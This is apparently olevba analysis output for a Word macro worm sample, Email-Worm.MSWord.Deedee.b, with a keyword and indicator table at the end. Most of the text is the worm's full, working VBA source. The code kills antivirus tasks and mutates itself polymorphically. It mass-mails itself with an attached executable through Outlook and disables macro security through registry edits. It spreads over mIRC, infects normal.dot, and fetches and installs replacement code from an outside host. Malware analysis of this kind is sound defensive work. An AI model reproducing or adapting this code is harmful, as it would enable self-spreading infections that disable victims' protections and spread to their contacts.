olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Deedee.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Deedee.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next '‰LQ'w5‡
'simulate "Cow" registry signature'pЌa'rxV
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\", "Cow") <> "Moooo" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\", "Cow") = "Moooo" '=E
End If 'wWk'O;Џ
'close any active AV tasks'8qE'tQ2
Set BLCMp = Tasks '3f‰'[7n
For PLQMp = 1 To BLCMp.Count '“yY'^L‹
If InStr(1, BLCMp(PLQMp).Name, "av", vbTextCompare) Or InStr(1, BLCMp(PLQMp).Name, "AV", vbTextCompare) Then
BLCMp(PLQMp).Close '[Ro'~ni
End If '-uz'[FI
Next PLQMp '#65'Ћm‚
'poly starts here:'_T'9__
Set BLCMp = ActiveDocument.VBProject '‚_…'JG:
Set BWJMp = BLCMp.VBComponents(1).CodeModule '|…v'b:3
If ThisDocument.FullName <> Templates(1).FullName Then 's4'tS‡
BFGMp = 18 'RJ9'o3P
ReDim CMSMp(1 To BFGMp) As String ',{u',q,
CMSMp(1) = "BFGMp": CMSMp(2) = "OXJMp": CMSMp(3) = "CMSMp": CMSMp(4) = "IWTMp" 'A|Q'~ej
CMSMp(5) = "IVPMp": CMSMp(6) = "PLQMp": CMSMp(7) = "BLCMp": CMSMp(8) = "CVOMp" '(ZX'RtW
CMSMp(9) = "HYHMp": CMSMp(10) = "CLCMp": CMSMp(11) = "LRLMp" ']G>'Bv0
CMSMp(12) = "WBIMp": CMSMp(13) = "MJOMp": CMSMp(14) = "AMCMp": CMSMp(15) = "CTIMp" 'Ђ‹G'O(Џ
CMSMp(16) = "GONMp": CMSMp(17) = "BWJMp": CMSMp(18) = "NFWMp" '-“]'3sD
'modify vars.'[_''Y‚
For PLQMp = 1 To BFGMp '2}g'ђL5
Randomize '\Pv'(Nl
IVPMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" '€a†
For OXJMp = 2 To BWJMp.CountOfLines 'Ќ”\'z_w
CVOMp = BWJMp.Lines(OXJMp, 1) ']g9'wK@
If InStr(1, CVOMp, CMSMp(PLQMp), vbTextCompare) Then '4bb'$YK
CVOMp = Replace(CVOMp, CMSMp(PLQMp), IVPMp, 1, -1, vbTextCompare) 'BE?'Ѓ&v
BWJMp.ReplaceLine OXJMp, CVOMp 'BЂЋ'$…(
End If '9I.'ln/
Next OXJMp 'xz$''Ht
Next PLQMp 'Q!p'y.q
'Add random chars, but not too many, don't wanna increase the size too much :)'>$`'Sa!
For PLQMp = 2 To BWJMp.CountOfLines '7p''Ifѓ
CVOMp = BWJMp.Lines(PLQMp, 1) '‰3*'36W
If Len(CVOMp) <= 100 Then '0ЋX'Dw}
CVOMp = CVOMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
BWJMp.ReplaceLine PLQMp, CVOMp '+ak'.E!
End If 'Ђ”a'>‘?
Next PLQMp '%d',QQ
End If 'Ћg.'G}—
'Actual virus'€€a''Rk
'-------------------------------------------------------------------'2G!'EN
'E-mail spread'‚\&'T$Q
'C:\installs.exe contains W32/Baboon'{•'T†D
FileCopy "C:\os4321.sys", "C:\installs.exe" '‚‹_'E‹?
WBIMp = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) 'znM'"e+
Set HYHMp = CreateObject(WBIMp + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
MJOMp = Chr(77) + Chr(65) + Chr(80) + Chr(73) 'Ma\'ЋX6
Set CLCMp = HYHMp.GetNameSpace(MJOMp) 'Uod'mL,
Set WBIMp = CLCMp.AddressLists ',Њu'e‚&
For PLQMp = 1 To WBIMp.Count 'J2{'oKF
Set ABook = CLCMp.AddressLists(PLQMp) 'J p'8XO
MJOMp = 1 '!Qk'6#!
Set AMCMp = ABook.AddressEntries 'nxW'•!$
Set LRLMp = HYHMp.CreateItem(0) '%“R'VP
For GONMp = 1 To AMCMp.Count '€xV'wO‰
CTIMp = AMCMp(MJOMp) '_#%'pW
LRLMp.Recipients.Add CTIMp 'OIЌ'0Ѓh
MJOMp = MJOMp + 1 'm)%'“-o
If MJOMp > 20 Then BFGMp = AMCMp.Count 'Ђ=w'ЌqB
Next GONMp '#G]'Q5k
IVPMp = ActiveDocument.FullName 'lYx'S</
LRLMp.Subject = "hya" 'Ca9'trG
LRLMp.Body = "some kewl stuff." 'L*D'bf}
LRLMp.Attachments.Add IVPMp '{Zu'#th
LRLMp.Attachments.Add "C:\installs.exe" 'zp;'eHЏ
LRLMp.Send 'C†.'|ѓd
CTIMp = "" 'ЋS+'b24
Next PLQMp 'sbq'J%P
'Check if is already infected'.^f'S~P
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Red") <> "Red Guy" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Red") = "Red Guy" '>kd
'No more security'‘‘^'l+Џ
Options.SaveNormalPrompt = 5 Xor 5 ';?M'{W0
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Open "C:\a.reg" For Output As #1 '?.V'YGJ
Print #1, "REGEDIT4" 'Rb;'”yZ
Print #1, "" 'RЌ9'7x†
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" '5+f':.„
Print #1, """Level"" = dword:00000001" 'C‚v'3vh
Print #1, """AccessVBOM"" = dword:00000001" 'F_)'q E
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]" 'GaЊ'{tk
Print #1, """doc"" = " + """" + ActiveDocument.FullName + """" '#a–'`“n
Close #1 'g7d'Qlk
Shell "C:\Windows\regedit /s C:\a.reg" 'd+3'%A+
Kill "C:\a.reg" 'Ypi'G"U
'Add a zip so mIRC won't autoignore it'Ora'f*@
Randomize 'rD~'J-—
IVPMp = ActiveDocument.FullName '$.e'K‰L
CVOMp = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".zip" '\^(' =|
scr = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".doc" '~”.'P$”
ActiveDocument.SaveAs scr 'Y2A'K]A
ActiveDocument.SaveAs IVPMp '3tu'}aK
IVPMp = Application.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "") '9‡O'F‘
Shell IVPMp & " -a -r " & CVOMp & Chr(32) & scr, vbHide 'a>B'NF4
Shell IVPMp & " -a -r " & CVOMp & Chr(32) & "C:\installs.exe", vbHide 'lU‹'LUL
Kill "C:\installs.exe" 'eLs'hbq
'Write a mIRC script'-L–'ak'
'Find the mIRC path'0/\'s09
IVPMp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC\", "UninstallString")
IVPMp = Mid(IVPMp, 2, Len(IVPMp) - 23) '>aX'^ЋЌ
Open IVPMp + "script.ini" For Output As #1 '—V5'ѓ(=
Print #1, "[Script]" '7<x';;'
Print #1, "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }" 'fSR'‘JS
Print #1, "n1=/dcc send $nick " & Chr(34) & CVOMp & Chr(34) 'Ѓw-'!~%
Print #1, "n2=}" '@ЃB'”T
Close #1 '"!S'JZ-
'Infect normal.dot'<']'+zR
BFGMp = BWJMp.CountOfLines 'Eoy'8OP
Set BLCMp = Templates(1).VBProject.VBComponents 'wЉ''{`
Set BWJMp = BLCMp.Item(1).CodeModule '”vP'}6
BWJMp.DeleteLines 1, BWJMp.CountOfLines 'w$Џ'o[l
BWJMp.InsertLines 1, "Sub Document_Close" 'v1ђ'•`H
For PLQMp = 2 To BFGMp ')("'—]N
Set BLCMp = ActiveDocument.VBProject 'Ѓ;\'mpЏ
Set BWJMp = BLCMp.VBComponents(1).CodeModule '=|l',€/
CVOMp = BWJMp.Lines(PLQMp, 1) 'k)Њ'LdO
Set BLCMp = Templates(1).VBProject.VBComponents 'lyq'$QH
Set BWJMp = BLCMp.Item(1).CodeModule '\‡;'k!Ђ
BWJMp.InsertLines PLQMp, CVOMp '”kv'^Ci
Next PLQMp '7t…'LЊ*
Set BLCMp = Templates(1) '*I~'o@M
BLCMp.Save '<;3'QsO
End If '†u%'a]~
'Check if file is infected (count the # of lines)'@-V'-kЃ
Set BLCMp = ActiveDocument.VBProject '\(Q'`9g
Set BWJMp = BLCMp.VBComponents(1).CodeModule 'xKl'TG(
BFGMp = BWJMp.CountOfLines 'cЏ('c,†
If Not ((BFGMp < 175) And (BFGMp > 173)) Then '‰ђz'4U2
BWJMp.DeleteLines 1, BFGMp '%Њ@'‹z‚
Set BLCMp = Templates(1).VBProject.VBComponents '~(o'‹E
Set BWJMp = BLCMp.Item(1).CodeModule 'zA!'*8G
CVOMp = BWJMp.Lines(1, 1) '‡L,'6…F
Set BLCMp = ActiveDocument.VBProject '~'V'#;d
Set BWJMp = BLCMp.VBComponents(1).CodeModule ''a-'Џ1A
BWJMp.InsertLines 1, CVOMp '_N1'T\(
BWJMp.InsertLines 2, "Sub Document_Open" '|N_'z`Њ
Set BLCMp = Templates(1).VBProject.VBComponents '…hQ'+E8
Set BWJMp = BLCMp.Item(1).CodeModule '0;,'/“C
BFGMp = BWJMp.CountOfLines '4HX'tZi
For PLQMp = 3 To BFGMp '-:?'X*†
CVOMp = BWJMp.Lines(PLQMp, 1) 'xS7'6ђJ
Set BLCMp = ActiveDocument.VBProject 'ЃЊw'CGI
Set BWJMp = BLCMp.VBComponents(1).CodeModule '1n^'†€p
BWJMp.InsertLines PLQMp, CVOMp 'r,]'M‰v
Next PLQMp '—MЋ'hPh
ActiveDocument.Save 'n'Ќ'NCX
End If 'Fr['9Q”
'Internet Up-Date'F@a'Z@/
Set NFWMp = CreateObject("InternetExplorer.Application") '!t_'PsN
   Do While NFWMp.Busy '~`l'}rK
   VBA.DoEvents 'W(k'+‚@
   Loop '{4”'t ]
   NFWMp.Visible = 0 '3w{'824
   NFWMp.Navigate "http://red.tripod.com" 'ЏGG'wnz
   Do While NFWMp.ReadyState <> 4 '“g~'z&q
   VBA.DoEvents '†ђ@'‹Њ-
   Loop '3zM'=?‹
   CVOMp = NFWMp.Document.Body.innerText 'wvc'.Y"
If Len(CVOMp) > 5000 Then 'Ђ7G'`z7
Set BLCMp = ActiveDocument.VBProject '“4l'A}7
Set BWJMp = BLCMp.VBComponents(1).CodeModule 'o>p'n‚k
BWJMp.DeleteLines 1, BWJMp.CountOfLines '?nђ'Wg
BWJMp.AddFromString CVOMp '…B8'D!Y
ActiveDocument.Save 'n€“' fa
End If '.@5'!?Z
NFWMp.Quit '…HE'*Ћ4
End Sub '=AI'.H’
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://red.tripod.co|URL                                          |
|          |m                   |                                             |
|IOC       |installs.exe        |Executable file name                         |
|IOC       |a.reg               |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

